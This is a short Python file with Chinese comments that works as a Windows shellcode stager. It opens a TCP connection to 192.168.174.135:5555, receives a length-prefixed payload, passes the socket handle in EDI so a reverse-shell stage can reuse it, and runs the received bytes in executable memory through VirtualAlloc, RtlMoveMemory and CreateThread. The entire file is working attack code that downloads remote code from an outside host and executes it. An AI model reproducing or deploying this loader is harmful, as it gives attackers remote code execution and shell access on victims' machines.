# -*- coding: utf-8 -*-

import socket
import struct
import ctypes

address = ('192.168.174.135', 5555)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(address)

# 获取后续payload大小
payload_size = struct.unpack("<I", bytearray(s.recv(4)))[0]

# socket 文件描述符，为了edi调用，原理请查看 https://akkuman.cnblogs.com/p/12859091.html
socket_fd = struct.pack('<I', s.fileno())

# mov edi, socket_fd
operation = b'\xbf' + socket_fd

# 设置flag接收全部数据
payload = s.recv(payload_size, socket.MSG_WAITALL)

payload_with_edicall = operation + payload

shellcode = bytearray(payload_with_edicall)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))